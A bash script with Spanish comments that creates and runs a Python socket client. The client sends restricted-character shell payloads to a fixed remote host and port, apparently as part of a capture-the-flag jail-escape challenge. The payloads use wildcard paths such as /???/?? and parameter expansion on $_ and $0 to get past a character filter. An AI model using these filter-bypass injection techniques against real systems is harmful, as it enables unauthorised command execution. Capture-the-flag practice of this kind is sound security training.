#!/bin/bash

# Este script intentará construir un payload para el challenge
# usando solo los caracteres permitidos: 0-9 $ { } / ? " : & > _ = ( ) y espacios

# Técnica: Usar expansión de parámetros para construir comandos

# Primero, necesitamos entender qué variables están disponibles en el shell remoto
# y cómo podemos extraer caracteres de ellas

# Por ejemplo, si ${_} = "/usr/bin/timeout"
# ${_:0:1} = "/"
# ${_:1:1} = "u"
# ${_:5:1} = "b"

# Pero primero necesito enviar algo al shell para establecer $_

# Voy a crear un script Python más avanzado que intente construir letras
# a partir de variables de entorno y luego usar esas letras para ejecutar comandos

cat > build_payload.py << 'PYTHON'
#!/usr/bin/env python3
import socket
import time

host = "94.237.57.1"
port = 33017

def interact(payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        
        # Skip banner
        data = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"$ " in chunk:
                    break
            except socket.timeout:
                break
        
        print(f"\n[+] Sending: {payload}")
        s.sendall(payload.encode() + b"\n")
        time.sleep(1.5)
        
        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        result = response.decode('utf-8', errors='ignore')
        print(result[:500])  # Print first 500 chars
        s.close()
        return result
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Try command substitution with /???/?? to get output
# Then use that to build more commands

payloads_to_try = [
    # Try to set $_ to something useful and then extract from it
    "/???/?? & ${_}",
    
    # Try to use parameter expansion in creative ways
    "${0##*/}",  # Remove everything up to last / from $0
    "${0%%/*}",  # Remove everything from first / onwards from $0
    
    # Try process substitution
    "$(/???/?? </???/????/????)",
]

for payload in payloads_to_try:
    interact(payload)
    time.sleep(1)

PYTHON
python3 build_payload.py
